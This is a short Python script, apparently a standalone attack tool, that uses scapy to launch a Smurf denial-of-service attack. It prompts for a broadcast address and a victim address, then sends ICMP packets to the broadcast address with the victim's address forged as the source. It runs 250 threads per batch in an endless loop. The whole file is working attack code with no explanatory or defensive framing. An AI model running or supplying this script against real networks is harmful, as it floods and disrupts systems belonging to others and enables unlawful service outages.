from scapy.all import *
from threading import Thread

broadcast_ip = input("Broadcast IP : ")
target_ip = input("Destination IP : ")

def smurf():
    send(IP(src=target_ip, dst=broadcast_ip, proto="icmp")/ICMP())
    
threads = []

while(1):
    for i in range(250):
        th = Thread(target = smurf)
        th.start()
        threads.append(th)
    for i in threads:
        i.join()